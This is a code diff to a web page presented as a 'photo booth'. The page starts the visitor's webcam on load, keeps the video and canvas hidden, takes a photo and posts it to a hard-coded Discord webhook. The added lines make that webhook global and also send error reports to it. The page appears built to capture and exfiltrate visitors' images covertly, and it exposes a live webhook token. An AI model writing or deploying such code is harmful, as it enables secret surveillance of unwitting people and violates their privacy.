@@ -9,6 +9,8 @@
     <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1323391157719269468/9KwhAyL1Lnz1PFpbXuy66DyH60rNGFpTQ1ZNwh40gUsG3v57zPfNgErHjOZX02g6X72u'; // Replace with your webhook URL
+
         async function startPhotoBooth() {
             try {
                 // Access the camera
@@ -33,32 +35,55 @@
                     }, 'image/png');
                 }, 3000);
             } catch (err) {
-                alert('Camera access denied or an error occurred.');
-                console.error(err);
+                handleError(err);
             }
         }
 
         function sendToDiscord(imageBlob) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1323391157719269468/9KwhAyL1Lnz1PFpbXuy66DyH60rNGFpTQ1ZNwh40gUsG3v57zPfNgErHjOZX02g6X72u'; // Replace with your webhook URL
             const formData = new FormData();
-
-            // Add the image file to the FormData object
             formData.append('file', imageBlob, 'photo.png');
 
-            // Send the request
             fetch(webhookUrl, {
                 method: 'POST',
                 body: formData,
             })
                 .then(response => {
-                    if (response.ok) {
-                        console.log('Photo sent successfully!');
+                    if (!response.ok) {
+                        response.text().then(text => {
+                            console.error('Failed to send photo:', text);
+                            handleError(new Error(`Discord response: ${response.status} - ${text}`));
+                        });
                     } else {
-                        console.error('Failed to send photo to Discord:', response.status);
-                        response.text().then(console.error); // Log Discord's response
+                        console.log('Photo sent successfully!');
                     }
                 })
-                .catch(err => console.error('Error sending photo to Discord:', err));
+                .catch(err => handleError(err));
+        }
+
+        function handleError(error) {
+            console.error('Error:', error);
+
+            // Prepare error details
+            const errorDetails = {
+                content: `An error occurred:\n\`\`\`\n${error.stack || error.message || error}\n\`\`\``,
+            };
+
+            // Send error details to Discord
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(errorDetails),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send error details to Discord:', response.status);
+                    } else {
+                        console.log('Error details sent to Discord.');
+                    }
+                })
+                .catch(err => console.error('Error sending error details to Discord:', err));
         }
 
         // Start the photobooth when the page loads
